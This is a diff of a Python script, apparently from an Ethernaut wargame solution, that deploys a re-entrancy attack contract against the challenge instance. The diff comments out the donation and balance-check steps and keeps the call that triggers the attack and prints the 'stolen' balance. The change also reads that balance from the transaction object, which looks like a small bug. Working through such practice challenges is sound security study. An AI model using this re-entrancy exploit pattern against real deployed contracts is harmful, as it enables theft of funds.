@@ -12,16 +12,16 @@ def main():
 
     attack = Attack10.deploy(ETHERNAUT_INSTANCE, AMOUNT, {"from": player})
 
-    print(f"\nre-entrancy attack successfully deployed\n")
+    # print(f"\nre-entrancy attack successfully deployed\n")
 
-    # interface.ReentrantInterface(ETHERNAUT_INSTANCE).donate(
-    #     attack.address, {"from": player, "value": AMOUNT}
-    # )
-    target.donate(attack.address, {"from": player, "value": AMOUNT})
+    # # interface.ReentrantInterface(ETHERNAUT_INSTANCE).donate(
+    # #     attack.address, {"from": player, "value": AMOUNT}
+    # # )
+    # target.donate(attack.address, {"from": player, "value": AMOUNT})
 
-    # the balance of ETHERNAUT_INSTANCE
-    balance_ether = web3.fromWei(target.balance(), "ether")
-    print(f"\nBalance of the attack contract = {balance_ether}\n")
+    # # the balance of ETHERNAUT_INSTANCE
+    # balance_ether = web3.fromWei(target.balance(), "ether")
+    # print(f"\nBalance of the attack contract = {balance_ether}\n")
 
-    attack.attack({"from": player, "gas_limit": 600000})
-    print(f"Stolen balance = {attack.balance()}")
+    tx = attack.attack({"from": player, "gas_limit": 600000})
+    print(f"Stolen balance = {tx.balance()}")
